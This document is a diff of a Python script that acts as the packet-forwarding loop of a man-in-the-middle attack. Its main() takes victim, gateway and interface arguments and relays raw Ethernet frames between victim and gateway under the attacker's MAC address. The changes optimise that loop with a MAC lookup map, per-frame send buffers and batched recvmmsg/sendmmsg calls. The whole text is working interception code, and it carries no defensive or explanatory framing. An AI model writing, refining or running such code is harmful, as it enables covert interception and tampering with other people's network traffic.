@@ -102,12 +102,15 @@ def main(IFACE, VICTIM, GATEWAY):
 
     recv_bufs = [bytearray(MAX_FRAME) for _ in range(BATCH_SIZE)]
     recv_mvs = [memoryview(b) for b in recv_bufs]
-    send_buf = bytearray(MAX_FRAME)
-    send_mv = memoryview(send_buf)
+
+    send_bufs = [bytearray(MAX_FRAME) for _ in range(BATCH_SIZE)]
+    send_mvs = [memoryview(b) for b in send_bufs]
 
     v_mac = victim_mac
     g_mac = gateway_mac
     a_mac = attacker_mac
+
+    mac_map = {v_mac: g_mac, g_mac: v_mac}
 
     def mac_to_str(b):
         return ':'.join(f"{x:02x}" for x in b)
@@ -124,33 +127,27 @@ def main(IFACE, VICTIM, GATEWAY):
     try:
         while True:
             if use_recvmmsg:
-                # batch receive
-                batch = []
                 n_received = s.recvmmsg(recv_mvs, 0)
+                send_iovs = []
+
                 for i in range(n_received):
                     frame = recv_mvs[i][:len(recv_mvs[i])]
                     src = bytes(frame[6:12])
-                    if src == a_mac:
+                    if src == a_mac or src not in mac_map:
                         continue
+
+                    dst_mac = mac_map[src]
                     send_len = min(len(frame), allowed_frame_max)
                     if send_len < len(frame) and not oversized_logged:
-                        print(f"warning: received frame {len(frame)} bytes > allowed {allowed_frame_max}; truncating.")
                         oversized_logged = True
-                    batch.append((frame, src, send_len))
+                        print(f"warning: frame {len(frame)} > allowed {allowed_frame_max}; truncating.")
 
-                # batch send
-                send_iovs = []
-                for frame, src, send_len in batch:
-                    if src == v_mac:
-                        send_mv[0:6] = g_mac
-                        send_mv[6:12] = a_mac
-                        send_mv[12:send_len] = frame[12:send_len]
-                        send_iovs.append(send_mv[:send_len])
-                    elif src == g_mac:
-                        send_mv[0:6] = v_mac
-                        send_mv[6:12] = a_mac
-                        send_mv[12:send_len] = frame[12:send_len]
-                        send_iovs.append(send_mv[:send_len])
+                    send_mv = send_mvs[i]
+                    send_mv[0:6] = dst_mac
+                    send_mv[6:12] = a_mac
+                    send_mv[12:send_len] = frame[12:send_len]
+                    send_iovs.append(send_mv[:send_len])
+
                 if send_iovs:
                     try:
                         s.sendmmsg(send_iovs)
@@ -160,32 +157,27 @@ def main(IFACE, VICTIM, GATEWAY):
                                 s.send(bytes(buf))
                             except Exception:
                                 s.sendto(bytes(buf), (IFACE,0))
+
             else:
-                # fallback single-packet loop
                 nbytes, _, _, _ = s.recvmsg_into([recv_mvs[0]],0)
                 if nbytes <= 14:
                     continue
                 frame = recv_mvs[0][:nbytes]
                 src = bytes(frame[6:12])
-                if src == a_mac:
+                if src == a_mac or src not in mac_map:
                     continue
+
+                dst_mac = mac_map[src]
                 send_len = min(nbytes, allowed_frame_max)
                 if send_len < nbytes and not oversized_logged:
-                    print(f"warning: received frame {nbytes} bytes > allowed {allowed_frame_max}; truncating.")
                     oversized_logged = True
+                    print(f"warning: frame {nbytes} > allowed {allowed_frame_max}; truncating.")
 
-                if src == v_mac:
-                    send_mv[0:6] = g_mac
-                    send_mv[6:12] = a_mac
-                    send_mv[12:send_len] = frame[12:send_len]
-                elif src == g_mac:
-                    send_mv[0:6] = v_mac
-                    send_mv[6:12] = a_mac
-                    send_mv[12:send_len] = frame[12:send_len]
-                else:
-                    continue
+                send_mv = send_mvs[0]
+                send_mv[0:6] = dst_mac
+                send_mv[6:12] = a_mac
+                send_mv[12:send_len] = frame[12:send_len]
 
-                # robust send: memoryview -> bytes -> sendto
                 try:
                     s.sendmsg([send_mv[:send_len]])
                 except Exception:
